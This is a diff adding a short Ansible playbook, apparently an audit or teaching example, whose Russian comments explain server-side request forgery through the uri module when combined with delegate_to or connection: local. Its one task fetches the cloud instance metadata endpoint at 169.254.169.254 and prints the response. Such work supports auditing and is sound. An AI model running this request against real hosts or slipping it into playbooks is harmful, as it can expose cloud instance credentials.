@@ -1,0 +1,16 @@
+- hosts: all
+  gather_facts: false
+
+  tasks:
+    - name: SSRF через модуль uri
+      # uri и get_url выполняются НА КЛИЕНТСКОМ хосте по умолчанию — но если
+      # к ним прицепить delegate_to: localhost или connection: local
+      # (см. выше), запрос уйдёт с сервера. Даже без delegate — сам факт,
+      # что это модуль сетевого запроса, стоит держать в уме при аудите
+      # связки с local_action/delegate_to/connection.
+      ansible.builtin.uri:
+        url: http://169.254.169.254/latest/meta-data/
+      register: resp
+
+    - debug:
+        var: resp.content
